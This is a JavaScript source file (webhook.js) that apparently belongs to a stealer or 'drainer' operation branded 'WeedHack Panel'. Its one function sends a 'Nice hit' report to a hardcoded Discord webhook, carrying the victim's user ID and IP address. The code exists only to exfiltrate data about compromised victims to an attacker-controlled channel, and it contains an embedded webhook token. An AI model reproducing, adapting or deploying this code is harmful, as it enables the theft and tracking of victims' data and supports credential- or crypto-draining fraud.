// language: JavaScript, file: webhook.js
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1565058208400277725/FQMq2XBJ3R0NLOCOYK7V3JqHUOLE2w-LFQ0YCO3TopumBc_B6EbPZ5GoCnQ6WmObwSbp';

export async function sendHitWebhook(userId, hitName, ipAddress) {
  if (!WEBHOOK_URL) return;

  const payload = {
    username: 'Allen wood',
    embeds: [
      {
        title: 'Nice hit ',
        color: 0x00FF00, // Green
        fields: [
          { name: 'User ID', value: `\`${userId}\``, inline: true },
          { name: 'Client Name', value: `\`No client neame cuz off txdrain\``, inline: true },
          { name: 'IP Address', value: `\`${ipAddress}\``, inline: false }
        ],
        footer: { text: 'WeedHack Panel' },
        timestamp: new Date().toISOString()
      }
    ]
  };

  try {
    await fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
  } catch (err) {
    console.error('[webhook] Failed to send hit:', err.message);
  }
}